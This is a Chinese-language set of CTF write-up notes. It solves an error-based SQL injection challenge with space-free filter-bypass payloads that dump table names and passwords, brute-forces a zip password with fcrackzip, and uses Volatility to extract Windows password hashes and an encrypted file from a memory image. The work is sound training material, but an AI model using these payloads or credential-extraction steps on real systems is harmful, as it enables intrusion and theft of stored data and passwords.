### 前置知识

这题首先都空格进行了严格过滤。用户输入中不允许带有空格，在无法使用空格的情况下，则需要**多用括号**，在使用括号的过程中，==关键字不允许被括号包裹==

```sql
# or 的左右并没有空格但依然可以正常回显
mysql> select * from str_intruder where id = '1'or(1);
+----+----------+----------+
| id | username | passwd   |
+----+----------+----------+
| 1  | jake     | Aa123456 |
| 2  | Gogo     | Aa123456 |
| 3  | Peo      | Aa123456 |
| 4  | Bob      | Aa123456 |
+----+----------+----------+
4 rows in set (0.00 sec)
```

### 解题流程

**1. 确定闭合方式**

```
username=admin&password=admin'%23
```

<img src="CTF.assets/image-20230622001931287.png" alt="image-20230622001931287" style="zoom:50%;" />

**2. 爆库**

```bash
username=admin&password=admin'or(updatexml(1,concat(0x7e,(select(database()))),3))%23
```

<img src="CTF.assets/image-20230622002635692.png" alt="image-20230622002635692" style="zoom:50%;" />

**3. 爆表**

这里由于过滤了`=`，所以使用`like`关键字

```bash
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like("geek")))),3))%23
```

<img src="CTF.assets/image-20230622002850353.png" alt="image-20230622002850353" style="zoom:50%;" />

**4. 爆字段**

由于这里的数据量比较小，所以不用指定数据表也能得到完整数据

```bash
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)like("geek")))),3))%23
```

<img src="CTF.assets/image-20230622003625827.png" alt="image-20230622003625827" style="zoom:50%;" />

**5. 拖库**

这里通过分析得到密码就是flag，但是由于这里对`substring()`或者是`substr?()`都做了过滤，查了一下，使用`left()`和`right()`函数

```bash
# 先使用left函数查出左半部分内容
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(left((group_concat(password)),30))from(H4rDsq1))),3))%23

# 再使用right函数查出右半部分内容
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(right((group_concat(password)),30))from(H4rDsq1))),3))%23

# flag：flag{ad1d3318-b81c-4db8-ad5f-48aaeefbbcb8}
```

<img src="CTF.assets/image-20230622004827285.png" alt="image-20230622004827285" style="zoom:50%;" />

# Misc

## János-the-Ripper-隐写-压缩包密码破解

发现一个压缩文件在里面

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
└─$ binwalk misc100 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 39, uncompressed size: 25, name: flag.txt
131           0x83            End of Zip archive, footer length: 22

```

`foremost`导出来，里面有一个加密的压缩文件

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf]
└─$ foremost misc100
Processing: misc100
|foundat=flag.txt
*|
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ ls
00000000.zip

```

`fcrackzip`爆破密码

```bash
# -b 爆破 -c 指定字符集为小写字母 -l 指定长度 -u 过滤错误密码
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ fcrackzip -b -c 'a' -l 4 -u 00000000.zip 


PASSWORD FOUND!!!!: pw == fish

```

解压缩得到密码

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ unzip 00000000.zip 
Archive:  00000000.zip
[00000000.zip] flag.txt password: 
  inflating: flag.txt                
                                                                                                                                                    
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ ls
00000000.zip  flag.txt
                                                                                                                                                    
┌──(pinginglab㉿pinginglab)-[~/桌面/ctf/output/zip]
└─$ cat flag.txt 
flag{ev3n::y0u::bru7us?!} 
```







## 数字取证

### 1. 不知道哪里的题目

> 内存文件下载连接：链接：https://pan.baidu.com/s/1xEV5bnB12C_qYp3fTb98Lg?pwd=q8rr 提取码：q8rr
>
> 工具 Volatility 自行下载安装

**1.1 分析镜像文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump imageinfo                                                
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/pinginglab/桌面/Cliente/mem.dump)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80003e02110L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80003e03d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-11-13 08:39:44 UTC+0000
     Image local date and time : 2019-11-13 16:39:44 +0800
```

**1.2 常规进程分析**

这里直接使用`Win7SP1x64`就好，可以看到启动了cmd

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 pslist |grep cmd  
Volatility Foundation Volatility Framework 2.6.1
0xfffffa800ea75b10 cmd.exe                2260   2316      1       20      1      0 2019-11-13 08:33:45 UTC+0000
```

**1.3 分析cmd**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 --help |grep "cmd"
Volatility Foundation Volatility Framework 2.6.1
  cmdline         Display process command-line arguments
  cmdscan         Extract command history by scanning for _COMMAND_HISTORY

┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 cmdscan             
Volatility Foundation Volatility Framework 2.6.1
**************************************************
CommandProcess: conhost.exe Pid: 2632
CommandHistory: 0x242350 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
# 这里发现提示，flag.ccx密码是管理员的密码
Cmd #0 @ 0x2229d0: flag.ccx_password_is_same_with_Administrator 
**************************************************
CommandProcess: conhost.exe Pid: 2748
CommandHistory: 0x2926d0 Application: DumpIt.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
```

**1.4 解密管理员密码**

Windows 的密码是保存在SAM文件中的，`hashdump`下载哈希

1. **用户名**：在这个例子中是`Administrator`。
2. **用户ID**：在这个例子中是`500`。
3. **LM散列**：在这个例子中是`6377a2fdb0151e35b75e0c8d76954a50`。
4. **NTLM散列**：在这个例子中是`0d546438b1f4c396753b4fc8c8565d5b`。
5. **评论**：在这个例子中为空。
6. **主目录**：在这个例子中为空。

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 hashdump
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:6377a2fdb0151e35b75e0c8d76954a50:0d546438b1f4c396753b4fc8c8565d5b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**1.5 CMD5解密获得密码**

<img src="CTF.assets/image-20230618175456601.png" alt="image-20230618175456601" style="zoom:50%;" />

**1.6 寻找flag.cxx文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 filescan |grep "flag"
Volatility Foundation Volatility Framework 2.6.1
0x000000003e435890     15      0 R--rw- \Device\HarddiskVolume2\Users\Administrator\Desktop\flag.ccx
```

**1.7 下载文件**

```bash
┌──(pinginglab㉿pinginglab)-[~/桌面/Cliente]
└─$ vol.py -f mem.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000003e435890 -D .
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x3e435890   None   \Device\HarddiskVolume2\Users\Administrator\Desktop\flag.ccx
```

**1.8 加密磁盘挂载**

成功提取出文件，根据查询ccx可以使用挂载系统加密卷的方式进行访问，可以使用CnCrypt进行加载

<img src="CTF.assets/image-20230618175947500.png" alt="image-20230618175947500" style="zoom:50%;" />

**1.9 获取flag**

<img src="CTF.assets/image-20230618180040413.png" alt="image-20230618180040413" style="zoom:50%;" />
